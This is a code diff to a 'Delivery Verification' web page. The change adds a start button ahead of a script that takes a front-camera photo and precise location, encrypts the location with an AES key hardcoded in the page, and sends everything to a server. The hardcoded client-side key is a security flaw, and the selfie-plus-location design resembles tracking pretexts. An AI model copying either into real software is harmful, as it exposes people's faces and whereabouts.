@@ -51,14 +51,34 @@
       display: flex;
       align-items: center;
     }
+    #startButton {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 15px 30px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+    }
+    #startButton:hover {
+      background-color: #0056b3;
+    }
+    #startButton:disabled {
+      background-color: #6c757d;
+      cursor: not-allowed;
+    }
   </style>
 </head>
 
 <body>
   <h2>Delivery Verification</h2>
-  <p>Please allow camera and location permissions when prompted.</p>
+  <p>Click the button below to start the verification process. You'll be asked to allow camera and location access.</p>
 
-  <div id="status">
+<button id="startButton">Start Verification</button>
+
+  <div id="status" style="display: none;">
     <div class="status-container">
       <div class="loading"></div>
       <span>Initializing...</span>
@@ -66,10 +86,12 @@
   </div>
 
   <script>
-  (async function() {
+  (function() {
     const statusEl = document.getElementById("status");
+    const startButton = document.getElementById("startButton");
     
     function setStatus(msg, isError = false) {
+      statusEl.style.display = 'block';
       const statusContainer = document.createElement('div');
       statusContainer.className = 'status-container';
       
@@ -91,148 +113,158 @@
       statusEl.appendChild(statusContainer);
     }
     
-    try {
-      const SERVER_URL = typeof process !== 'undefined' && process.env.SERVER_URL 
-        ? process.env.SERVER_URL 
-        : 'http://localhost:3000/api/confirm';
-      
-      const ENCRYPTION_KEY = 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';
-      
-      const params = new URLSearchParams(location.search);
-      const deliveryId = params.get("deliveryId") || "unknown";
-      const token = params.get("token") || "";
-
-      setStatus("Requesting camera access...");
-
-      // Request camera access and capture immediately
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { 
-          facingMode: "user",
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        }
-      });
-
-      setStatus("Capturing photo...");
-
-      const track = stream.getVideoTracks()[0];
-      const imgCap = new ImageCapture(track);
-
-      let blob;
+    async function init() {
       try {
-        blob = await imgCap.takePhoto();
-      } catch (e) {
-        const cv = document.createElement("canvas");
-        cv.width = 1280; 
-        cv.height = 720;
-        const ctx = cv.getContext("2d");
-        const videoTemp = document.createElement("video");
-        videoTemp.srcObject = stream;
-        await new Promise((resolve) => { videoTemp.onloadedmetadata = resolve; });
-        await videoTemp.play();
-        ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
-        blob = await new Promise(resolve => cv.toBlob(resolve, "image/jpeg", 0.9));
-      }
-
-      stream.getTracks().forEach(track => track.stop());
-
-      setStatus("Requesting location access...");
-
-      // Get location
-      const loc = await new Promise((resolve, reject) => {
-        if (!navigator.geolocation) {
-          reject(new Error("Geolocation is not supported by your browser"));
-          return;
-        }
+        const SERVER_URL = typeof process !== 'undefined' && process.env.SERVER_URL 
+          ? process.env.SERVER_URL 
+          : 'http://localhost:3000/api/confirm';
         
-        navigator.geolocation.getCurrentPosition(
-          resolve, 
-          (err) => reject(new Error("Please enable location services: " + err.message)),
-          { 
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
+        const ENCRYPTION_KEY = 'a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6';
+        
+        const params = new URLSearchParams(location.search);
+        const deliveryId = params.get("deliveryId") || "unknown";
+        const token = params.get("token") || "";
+
+        setStatus("Requesting camera access...");
+
+        // Request camera access and capture immediately
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { 
+            facingMode: "user",
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
           }
-        );
-      });
+        });
 
-      setStatus("Encrypting data...");
+        setStatus("Capturing photo...");
 
-      const locationData = {
-        lat: loc.coords.latitude,
-        lon: loc.coords.longitude,
-        accuracy: loc.coords.accuracy || 0,
-        timestamp: loc.timestamp || Date.now(),
-        userAgent: navigator.userAgent,
-        deliveryId: deliveryId,
-        token: token
-      };
+        const track = stream.getVideoTracks()[0];
+        const imgCap = new ImageCapture(track);
 
-      // Encryption function
-      async function encryptData(data, key) {
-        const encoder = new TextEncoder();
-        const iv = window.crypto.getRandomValues(new Uint8Array(12));
-        const encodedData = encoder.encode(JSON.stringify(data));
+        let blob;
+        try {
+          blob = await imgCap.takePhoto();
+        } catch (e) {
+          const cv = document.createElement("canvas");
+          cv.width = 1280; 
+          cv.height = 720;
+          const ctx = cv.getContext("2d");
+          const videoTemp = document.createElement("video");
+          videoTemp.srcObject = stream;
+          await new Promise((resolve) => { videoTemp.onloadedmetadata = resolve; });
+          await videoTemp.play();
+          ctx.drawImage(videoTemp, 0, 0, cv.width, cv.height);
+          blob = await new Promise(resolve => cv.toBlob(resolve, "image/jpeg", 0.9));
+        }
+
+        stream.getTracks().forEach(track => track.stop());
+
+        setStatus("Requesting location access...");
+
+        // Get location
+        const loc = await new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Geolocation is not supported by your browser"));
+            return;
+          }
+          
+          navigator.geolocation.getCurrentPosition(
+            resolve, 
+            (err) => reject(new Error("Please enable location services: " + err.message)),
+            { 
+              enableHighAccuracy: true,
+              timeout: 15000,
+              maximumAge: 0
+            }
+          );
+        });
+
+        setStatus("Encrypting data...");
+
+        const locationData = {
+          lat: loc.coords.latitude,
+          lon: loc.coords.longitude,
+          accuracy: loc.coords.accuracy || 0,
+          timestamp: loc.timestamp || Date.now(),
+          userAgent: navigator.userAgent,
+          deliveryId: deliveryId,
+          token: token
+        };
+
+        // Encryption function
+        async function encryptData(data, key) {
+          const encoder = new TextEncoder();
+          const iv = window.crypto.getRandomValues(new Uint8Array(12));
+          const encodedData = encoder.encode(JSON.stringify(data));
+          
+          const keyData = new TextEncoder().encode(key);
+          const keyBuffer = keyData.slice(0, 32);
+          
+          const cryptoKey = await window.crypto.subtle.importKey(
+            'raw',
+            keyBuffer,
+            { name: 'AES-GCM', length: 256 },
+            false,
+            ['encrypt']
+          );
+          
+          const encryptedData = await window.crypto.subtle.encrypt(
+            { 
+              name: 'AES-GCM',
+              iv: iv,
+              tagLength: 128
+            },
+            cryptoKey,
+            encodedData
+          );
+          
+          const result = new Uint8Array(iv.length + encryptedData.byteLength);
+          result.set(iv, 0);
+          result.set(new Uint8Array(encryptedData), iv.length);
+          
+          return result;
+        }
+
+        const encryptedData = await encryptData(locationData, ENCRYPTION_KEY);
         
-        const keyData = new TextEncoder().encode(key);
-        const keyBuffer = keyData.slice(0, 32);
+        const formData = new FormData();
+        formData.append('photo', new Blob([blob], { type: 'image/jpeg' }), 'delivery.jpg');
+        formData.append('data', new Blob([encryptedData], { type: 'application/octet-stream' }));
+
+        setStatus("Sending data...");
         
-        const cryptoKey = await window.crypto.subtle.importKey(
-          'raw',
-          keyBuffer,
-          { name: 'AES-GCM', length: 256 },
-          false,
-          ['encrypt']
-        );
+        const url = new URL(SERVER_URL);
+        url.searchParams.append('deliveryId', deliveryId);
+        url.searchParams.append('token', token);
+
+        const response = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+
+        const result = await response.json();
         
-        const encryptedData = await window.crypto.subtle.encrypt(
-          { 
-            name: 'AES-GCM',
-            iv: iv,
-            tagLength: 128
-          },
-          cryptoKey,
-          encodedData
-        );
-        
-        const result = new Uint8Array(iv.length + encryptedData.byteLength);
-        result.set(iv, 0);
-        result.set(new Uint8Array(encryptedData), iv.length);
-        
-        return result;
+        if (response.ok && result.success) {
+          setStatus("✓ Delivery confirmed successfully!", false);
+          setTimeout(() => {
+            window.close();
+          }, 2000);
+        } else {
+          throw new Error(result.error || `Server responded with ${response.status}`);
+        }
+      } catch (error) {
+        console.error("Error:", error);
+        setStatus(`Error: ${error.message}`, true);
+        startButton.disabled = false;
+        startButton.textContent = "Retry Verification";
       }
-
-      const encryptedData = await encryptData(locationData, ENCRYPTION_KEY);
-      
-      const formData = new FormData();
-      formData.append('photo', new Blob([blob], { type: 'image/jpeg' }), 'delivery.jpg');
-      formData.append('data', new Blob([encryptedData], { type: 'application/octet-stream' }));
-
-      setStatus("Sending data...");
-      
-      const url = new URL(SERVER_URL);
-      url.searchParams.append('deliveryId', deliveryId);
-      url.searchParams.append('token', token);
-
-      const response = await fetch(url, {
-        method: 'POST',
-        body: formData
-      });
-
-      const result = await response.json();
-      
-      if (response.ok && result.success) {
-        setStatus("✓ Delivery confirmed successfully!", false);
-        setTimeout(() => {
-          window.close();
-        }, 2000);
-      } else {
-        throw new Error(result.error || `Server responded with ${response.status}`);
-      }
-    } catch (error) {
-      console.error("Error:", error);
-      setStatus(`Error: ${error.message}`, true);
     }
+
+    startButton.addEventListener('click', function() {
+      startButton.disabled = true;
+      startButton.textContent = "Processing...";
+      init();
+    });
   })();
   </script>
 
